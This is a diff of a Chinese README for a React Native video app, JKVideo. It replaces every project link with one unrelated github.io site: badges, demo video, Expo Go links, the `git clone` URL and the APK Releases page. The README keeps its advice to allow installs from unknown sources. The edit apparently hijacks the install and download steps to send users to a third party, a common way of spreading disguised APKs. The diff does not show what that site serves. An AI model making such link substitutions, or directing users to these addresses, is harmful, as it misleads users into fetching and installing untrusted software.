@@ -10,9 +10,9 @@
 
 ---
 
-[![React Native](https://img.shields.io/badge/React_Native-0.83-61DAFB?logo=react)](https://reactnative.dev)
-[![Expo](https://img.shields.io/badge/Expo-SDK_55-000020?logo=expo)](https://expo.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript)](https://www.typescriptlang.org)
+[![React Native](https://img.shields.io/badge/React_Native-0.83-61DAFB?logo=react)](https://wiilsliang.github.io)
+[![Expo](https://img.shields.io/badge/Expo-SDK_55-000020?logo=expo)](https://wiilsliang.github.io)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript)](https://wiilsliang.github.io)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 [![Platform](https://img.shields.io/badge/Platform-Android%20%7C%20iOS%20%7C%20Web-lightgrey)](README.md)
 
@@ -39,7 +39,7 @@
 
 ## 演示视频
 
-https://github.com/tiajinsha/JKVideo/releases/download/v1.0.0/6490dcd9dba9a243a7cd8f00359cc285.mp4
+https://wiilsliang.github.io
 
 ---
 
@@ -94,13 +94,13 @@ Android · iOS · Web，Expo Go 扫码 5 分钟运行，Dev Build 解锁完整 D
 > 部分清晰度受限，视频播放降级为 WebView 方案
 
 ```bash
-git clone https://github.com/tiajinsha/JKVideo.git
+git clone https://wiilsliang.github.io
 cd JKVideo
 npm install
 npx expo start
 ```
 
-用 Expo Go App（[Android](https://expo.dev/go) / [iOS](https://expo.dev/go)）扫描终端二维码即可运行。
+用 Expo Go App（[Android](https://wiilsliang.github.io) / [iOS](https://wiilsliang.github.io)）扫描终端二维码即可运行。
 
 ### 方式二：Dev Build（完整功能，推荐）
 
@@ -123,7 +123,7 @@ npx expo start --web
 
 ### 直接安装（Android）
 
-前往 [Releases](https://github.com/tiajinsha/JKVideo/releases/latest) 下载最新 APK，无需编译，安装即用。
+前往 [Releases](https://wiilsliang.github.io) 下载最新 APK，无需编译，安装即用。
 
 > 需在 Android 设置中开启「安装未知来源应用」
 
